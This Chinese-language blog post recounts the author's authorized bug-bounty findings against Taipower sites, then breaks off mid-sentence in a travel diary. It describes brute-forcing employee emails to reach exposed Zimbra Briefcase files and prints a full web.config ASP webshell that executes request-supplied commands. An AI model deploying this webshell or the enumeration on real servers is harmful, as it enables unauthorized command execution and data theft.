---
title: 台電 Bug Bounty 參加記
url: http://blog.kaibro.tw/2023/03/18/%E5%8F%B0%E9%9B%BB-Bug-Bounty-%E5%8F%83%E5%8A%A0%E8%A8%98/
source: Kaibro's blog
date: 2023-03-19
fetch_date: 2025-10-04T10:01:32.038707
---

# 台電 Bug Bounty 參加記

[![](/img/head.jpg)](/)

# [KaiBro](/)

* Menu
* 標籤
* 關於

* [主頁](/)
* [所有文章](/archives)
* [關於我](http://cv.kaibro.tw/)
* [New Blog](http://blog.30cm.club/)

[github](https://github.com/w181496 "github")
[rss](/atom.xml "rss")
[facebook](https://www.facebook.com/w181496 "facebook")
[twitter](https://twitter.com/KAIKAIBRO "twitter")

[BugBounty](/tags/BugBounty/) [CTF](/tags/CTF/) [DEFCON](/tags/DEFCON/) [Java](/tags/Java/) [Linux](/tags/Linux/) [NCU](/tags/NCU/) [NTU](/tags/NTU/) [Pwn](/tags/Pwn/) [Web](/tags/Web/) [筆記](/tags/%E7%AD%86%E8%A8%98/) [開箱](/tags/%E9%96%8B%E7%AE%B1/) [開箱文](/tags/%E9%96%8B%E7%AE%B1%E6%96%87/)

Web security菜雞

# KaiBro

![](/img/head.jpg)

# KaiBro

* [主頁](/)
* [所有文章](/archives)
* [關於我](http://cv.kaibro.tw/)
* [New Blog](http://blog.30cm.club/)

[github](https://github.com/w181496 "github")
[rss](/atom.xml "rss")
[facebook](https://www.facebook.com/w181496 "facebook")
[twitter](https://twitter.com/KAIKAIBRO "twitter")

[2023-03-18](/2023/03/18/%E5%8F%B0%E9%9B%BB-Bug-Bounty-%E5%8F%83%E5%8A%A0%E8%A8%98/)

# 台電 Bug Bounty 參加記

* [BugBounty](tags/BugBounty/)
* [Web](tags/Web/)

## 前言

去年參加了台電舉辦 Bug Bounty 競賽，運氣好刷到第二名，個人認為蠻適合想接觸 Bug Bounty 的人來挑戰。

所以這篇主要介紹台灣的 Bounty Program 和去年參加完台電 Bug Bounty 的一些心得跟~~遊記~~，希望能讓有興趣接觸 Bounty 的人看完後也可以找到一點方向。

## Bug Bounty 介紹

Bug Bounty 白話來說，就是讓駭客可以合法挖企業網站漏洞，然後企業根據漏洞嚴重程度給予對應獎金的機制。

國外 Bug Bounty 風氣興盛，從 [Hackerone](https://www.hackerone.com/), [Bugcrowd](https://www.bugcrowd.com/) 等平台上，就能看到大家日常生活中耳熟能詳的品牌、企業其實大多都有開 Bounty Program 吸引白帽駭客幫忙挖掘漏洞。

但真的要從中找到漏洞或是賺到大錢，其實也沒有那麼容易，畢竟國外的 Bug Hunter 數量還是蠻多的，過於簡單或是明顯的漏洞基本上都已經被看得差不多了

想要從大家都已經看爛掉的目標找到洞，不外乎就是要砸大量時間下去研究沒有人想過、看過的攻擊面向，或是等新功能推出時搶先他人發現漏洞等。

只是大家很容易忽略一個重點：愈少人看的目標，理論上相對容易挖到漏洞。

所以據我所知，有個流派就是鑽門去找一些冷僻功能，或是限制特定地區、國家的使用者才能使用的功能，從中去挖掘還沒有人看過的漏洞，競爭對手直接少掉一大半。

除此之外，其實還有個不算秘訣的小秘訣。

就是台灣其實自己也有 Bug Bounty Program，而且很多都限制台灣人才能參與，符合我們前面講的原則，理論上難度會相對國外小很多。

舉例，像是 HITCON Zeroday 平台其實上面就有列了一些可以參與的 Bounty Program:

<https://zeroday.hitcon.org/bug-bounty/list>

而本文的主角-台電，就是上面 Bounty Program 清單成員之一。
(不過發文的當下，活動已經下架XD)

除此之外，台灣偶爾也會舉辦一些漏洞挖掘競賽，其實也是個不錯的入門挑戰目標。

像是 2020 年的民生公共物聯網漏洞挖掘競賽，小弟曾經和幾個夥伴運氣好刷分刷到第一，舒舒服服抱走 50 萬大獎幫晚餐加菜。

![](https://i.imgur.com/xDyRWC2.png)

## 台電 Bug Bounty

去年 (2022 年) 台電舉辦了兩次 Bug Bounty 活動，我剛好兩次都有參加到，所以來簡單分享一下挖洞過程。

上半年的那次，因為工作比較忙的關係，其實總共只有花一天 (嚴格來說是一個中午) 在挖洞而已。

但還是運氣好挖了兩個高危漏洞：

* [SQL Injection](https://zeroday.hitcon.org/vulnerability/ZD-2022-00160)
* [Arbitrary File Download](https://zeroday.hitcon.org/vulnerability/ZD-2022-00161)

還記得任意檔案下載那個洞，我當時只是簡單的 Google Hacking 找一些 `file`, `download` 之類的關鍵字，就發現他的 `file.ashx` 下載路徑沒有任何檢查，直接 `../` 就能遍歷目錄去讀檔案。

另一個 SQL Injection 也是隨手翻翻台電網站時，看到 `mid` 參數隨手插個單引號，發現行為詭異，深入測試才發現有 SQL Injection 漏洞的。

從這可以看到，整體漏洞利用難度都非常低，要找到洞也非常容易，也很明顯可以看到打台灣 Bug Bounty 的優勢，競爭者非常少。

<https://www.taipower.com.tw/upload/18/2022070417164521373.pdf>

最後在這期榜單上排名第五，獎金台幣 $30000。

雖然獎金不像國外那麼大方，但如果把漏洞挖掘難易度、花費時間考慮進來，其實某種程度上來說頗賺的(?)

---

下半年，台電又開了一次 Bug Bounty，而且活動時間只有短短一個月。

好巧不巧，期間剛好碰到裴洛西訪台事件，導致對岸駭客不斷對台電網站發起攻擊流量。

所以這段時間，常常會看到這種新聞：
[台電單日遭駭客攻擊490萬次　發言人證實：超過6、7月總和](https://www.upmedia.mg/news_info.php?Type=24&SerialNo=150939)

(偷偷說，我那段時間剛好發現一個[需要暴力窮舉的漏洞](https://zeroday.hitcon.org/vulnerability/ZD-2022-00587)，我高度懷疑 490 萬次攻擊流量可能有一半是來自我==)

這一期活動由於時間比較充裕，而且嚐到上一次的甜頭，所以有稍微花點力氣認真戳一下。

最後總共挖到這些漏洞：

* [Confidential Information Leak](https://zeroday.hitcon.org/vulnerability/ZD-2022-00587)
* [Remote Code Execution](https://zeroday.hitcon.org/vulnerability/ZD-2022-00616)
* [Source Code Leak](https://zeroday.hitcon.org/vulnerability/ZD-2022-00617)
* [SQL Injection](https://zeroday.hitcon.org/vulnerability/ZD-2022-00619)
* [Cross-Site Scripting](https://zeroday.hitcon.org/vulnerability/ZD-2022-00620)
* [Broken Access Control](https://zeroday.hitcon.org/vulnerability/ZD-2022-00621)
* [Broken Access Control](https://zeroday.hitcon.org/vulnerability/ZD-2022-00622)
* [Weak Password](https://zeroday.hitcon.org/vulnerability/ZD-2022-00625)
* [SQL Injection](https://zeroday.hitcon.org/vulnerability/ZD-2022-00629)
* [SSRF](https://zeroday.hitcon.org/vulnerability/ZD-2022-00630)
* [Broken Access Control](https://zeroday.hitcon.org/vulnerability/ZD-2022-00660)
* [Broken Access Control](https://zeroday.hitcon.org/vulnerability/ZD-2022-00663)
* [Arbitrary File Read](https://zeroday.hitcon.org/vulnerability/ZD-2022-00673)

由於漏洞比較多，這裡就挑兩個洞出來講，剩下大家有興趣可以點上面 Report 自己看細節。

1. [Confidential Information Leak](https://zeroday.hitcon.org/vulnerability/ZD-2022-00587)

這個洞應該算是我這次覺得最有趣的一個洞。

台電的 webmail 是用 Zimbra 這套，然後我在 Recon 過程時，就發現他們有些員工會用 Zimbra 的 Briefcase 功能分享檔案。

BriefCase 根據[官方文件](http://docs.zimbra.com/desktop7/help/en_US/Briefcase/Working_in_Briefcase.htm)可以知道，基本上就是一個可以上傳檔案、共享文件的功能，而且可以 Share 檔案給組織外的人。

BriefCase 的網址大概長得像這種格式:

|  |  |
| --- | --- |
| ```  1 ``` | ```  https://{HOST}/home/{EMAIL}/Briefcase/ ``` |

如果沒有設定 BriefCase 權限的話，外部訪客只要知道網址，就可以列出下面的檔案和下載裡面的資料！

這邊要利用之前，其實有一個難點要解決，就是 `{EMAIL}` 的部分，基本上就是員工的 email 地址，但是我們要怎麼知道這間組織裡的員工 email 地址是啥呢？

好巧不巧，台電員工的 email 命名規則剛剛好是用工號流水號的方式命名，所以我只要暴力窮舉員工工號，就可以看到有誰 BriefCase 下的權限沒設好。

最後就像報告裡面寫的，還真的炸出一堆人沒設好權限，然後裡面放了一堆高度敏感的檔案可以隨意被下載，像是帳密表、公文、開會簡報、架構圖、行事曆、VPN 金鑰等。

(有趣的是，我甚至可以拿到他們的開會 Link 進去一起開會XDD)

![](https://i.imgur.com/lcJiN67.png)

但這個洞最後評審判出來，還比一個不太能利用的 SQL Injection 獎金還低，自己覺得算是頗可惜XD

1. [Remote Code Execution](https://zeroday.hitcon.org/vulnerability/ZD-2022-00616)

這個洞也有一點點有趣，簡單說就是一個任意上傳漏洞，寫檔位置和檔案內容都可控，然後環境是 Windows。

這種場景，正常的思路就是想辦法上傳一個 Webshell 到網頁目錄，就打完收工回家開趴吃炸雞了。

但這邊我遇到的困境是，我找不到他的網頁根目錄在哪 XD

嘗試過各種常見的網頁目錄路徑或是各種常見的老梗招都失敗，一度踹到想要放棄。

後來發現這個上傳功能有個特性，當給的路徑是存在資料夾時，他會回錯誤訊息！

也就是說，我可以透過錯誤訊息判斷某個資料夾存不存在，例如 `C:\windows\` 和 `C:\kaibro\` 就會是不同的 Response。

這樣做的好處是，我可以判斷我當前路徑是在哪一層，也可以去猜底下有哪些目錄存在，一層一層去找網頁目錄到底在哪。

最棒的是，他還支援短檔名格式，例如 `C:\templates` 和 `C:\templa~1` 結果是相同的，可以減少窮舉的時間。

直到最後才發現 `C:\` 底下有個 `var` 資料夾，然後會 Mapping 到網站 URL 的 `/var/*` 下。

但還沒完，這邊我發現直接傳 asp, aspx, asmx 都不會解析，猜測他有對伺服器特別做設定來防禦。

最後只好搬出老梗招，上傳 `web.config` 並在裡面塞 webshell，才成功取得 Remote Code Execution 結束這回合。

|  |  |
| --- | --- |
| ```  1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30 ``` | ```  <?xml version="1.0" encoding="UTF-8"?>  <configuration>  <system.webServer>  <handlers accessPolicy="Read, Script, Write">  <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />  </handlers>  <security>  <requestFiltering>  <fileExtensions>  <remove fileExtension=".config" />  </fileExtensions>  <hiddenSegments>  <remove segment="web.config" />  </hiddenSegments>  </requestFiltering>  </security>  </system.webServer>  </configuration>  <!--  <%  Response.Write("-"&"->")  Function GetCommandOutput(command)  Set shell = CreateObject("WScript.Shell")  Set exec = shell.Exec(command)  GetCommandOutput = exec.StdOut.ReadAll  End Function  Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))  Response.Write("<!-"&"-")  %>  --> ``` |

![](https://i.imgur.com/dtjvBaq.png)

---

<https://www.taipower.com.tw/upload/18/2023013115474997409.pdf>

最後這期排行榜出來，成功刷上第二名，總共拿到台幣 $140000 獎金。

不過老實說，這次的 C/P 值就沒有上一期那麼高了，畢竟這次可是費了一點力氣才找到 RCE 洞，結果 RCE 對應的獎金才值 3.5 萬元，超哭 XDD

有趣的是，台電對於弱密碼問題，給的錢其實算是相對蠻高的，可以看到一堆人在洗弱密碼洞，應該也算是一條 C/P 值比較高的打法。

小插曲：
由於台灣 Bug Bounty 通常對於漏洞認定都相對比較模糊，所以我特別問了官方一些有趣的問題：
![](https://i.imgur.com/jZ8Kz33.png)
懂的都懂，未來想洗台電 Bug Bounty 的朋友，看到這張圖，應該知道怎麼做了吧(X)

## 頒獎典禮暨台電秘境旅遊

每期台電似乎都會舉辦頒獎典禮，邀請駭客去切磋交流一下，但我上半年那期剛好有事沒辦法去，想說下半年也許可以參加看看。

最後收到邀請信，看到這期頒獎典禮居然是舉辦在高雄或南投的「秘境」：

![](https://i.imgur.com/CbLZ5Oh.png)

當下第一眼的反應是: 「ㄎㄅ，這是一個要去深山滅口的節奏嗎？」

但身為駭客還是要有點冒險精神，而且這些「台電秘境」似乎一般人平時也不容易進得去，錯過似乎有點可惜，所以最後就果斷答應參加了。

行程上是兩天一夜，第一天是頒獎典禮，第二天是秘境郊遊。

還記得當天集合點是在台中高鐵站，台電包了一台小巴士，等時間到就發車載去日月潭活動地點。

令我印象很深刻的是，最後集合時只有我一個白帽駭客到場，其他被邀請的駭客似乎都放棄參加頒獎典禮，心中立馬出現這句話:

![](https://i.imgur.com/9MhTA0x.png)

然後遊覽車上其他人似乎都是台電長官，有種神秘的氛圍，一路上整台車都蠻安靜的。

而且不知道為啥，坐在小巴士的當下，有一種跟以前當兵被集合送去營區很類似的感覺XD

![](https://i.imgur.com/OxbLmIC.jpg)

經過數個小時車程之後，終於能從車窗外看到日月潭，波光粼粼的湖面確實還是挺美的。

![](https://i.imgur.com/QKdNFc5.jpg)

最後在晚上要入住的日月潭大飯店下車，然後放...